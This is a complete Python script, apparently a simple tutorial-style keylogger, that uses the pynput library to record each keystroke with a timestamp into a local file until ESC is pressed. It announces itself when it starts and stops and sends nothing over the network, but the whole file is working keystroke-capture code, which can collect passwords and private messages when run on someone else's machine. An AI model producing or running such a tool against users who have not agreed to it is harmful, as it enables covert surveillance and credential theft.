from pynput import keyboard
import datetime
import os

# File to store logged keystrokes
LOG_FILE = "keystrokes.log"

def on_press(key):
    """Handle key press events and log to file."""
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Convert key to string
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key).replace('Key.', '')  # Handle special keys

        # Log the key with timestamp
        with open(LOG_FILE, 'a') as f:
            f.write(f'[{timestamp}] {key_str}\n')

    except Exception as e:
        with open(LOG_FILE, 'a') as f:
            f.write(f'[{timestamp}] Error: {str(e)}\n')

def on_release(key):
    """Stop keylogger on ESC and log the stop message."""
    if key == keyboard.Key.esc:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, 'a') as f:
            f.write(f'[{timestamp}] ESC pressed. Keylogger stopped.\n')
        print("Keylogger Stopped.")
        return False

# Initialize log file if not exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as f:
        f.write("Keylogger log\n")

# Start listening
print(f"Keystrokes will be logged to [{LOG_FILE}]")
print("Keylogger Started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

